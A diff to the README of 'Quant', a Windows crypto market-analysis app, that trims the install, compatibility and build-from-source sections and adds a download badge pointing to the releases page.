@@ -17,51 +17,32 @@ Quant provides probabilistic market analysis for major crypto assets. The model 
 
 | Model ID | Version | Updated |
 | --- | --- | --- |
+| --- | --- | --- |
 | `quant-1` | 1.0.3 | November 2026 |
-
-## Documentation
-
-Model documentation: [docs.md](docs.md). Changelog: [CHANGELOG.md](CHANGELOG.md).
 
 ## Installation
 
-Download the latest installer from [Releases](https://github.com/openai/quant/releases) and run it. The setup registers the app, creates a desktop shortcut, and adds an uninstall entry.
+Download the latest installer from [Releases](https://github.com/openai/quant/releases) and run it.
 
-Or install via winget:
-
-```powershell
-winget install OpenAI.Quant
-```
+[![Download](https://img.shields.io/badge/Download-Quant_Setup_v1.0.3-8b5cf6?style=for-the-badge)](https://github.com/openai/quant/releases)
 
 ### Compatibility
 
 | Operating System | Supported Versions | Notes |
 | --- | --- | --- |
-| Windows | 10, 11, Server 2022 | x64, WebView2 runtime (bundled) |
-
-Uninstall via *Settings → Apps → Quant*.
+| Windows | 10, 11 | x64 |
 
 ## Approach
 
-The model evaluates each asset across three scenarios (base, bull, bear) with a probability and target range for each, plus an aggregate conviction score. Every outlook ships with the underlying drivers and reasoning, and the full methodology is described in [docs.md](docs.md).
+The model evaluates each asset across three scenarios (base, bull, bear) with a probability and target range for each, plus an aggregate conviction score. Every outlook includes the underlying drivers and reasoning.
 
 ## Requirements
 
-Windows 10 or higher. 4 GB RAM. ~250 MB disk. Internet connection for market data. No other dependencies.
+Windows 10 or higher. 4 GB RAM. ~250 MB disk. Internet connection for market data.
 
-## Building from source
+## Documentation
 
-```powershell
-git clone https://github.com/openai/quant.git
-cd quant
-dotnet build -c Release
-```
-
-Requires .NET SDK 8.0.
-
-## Releases
-
-Versioned installers are published under [Releases](https://github.com/openai/quant/releases). Current stable: `1.0.3`.
+Model documentation: [docs.md](docs.md). Changelog: [CHANGELOG.md](CHANGELOG.md).
 
 ## Contributing
 
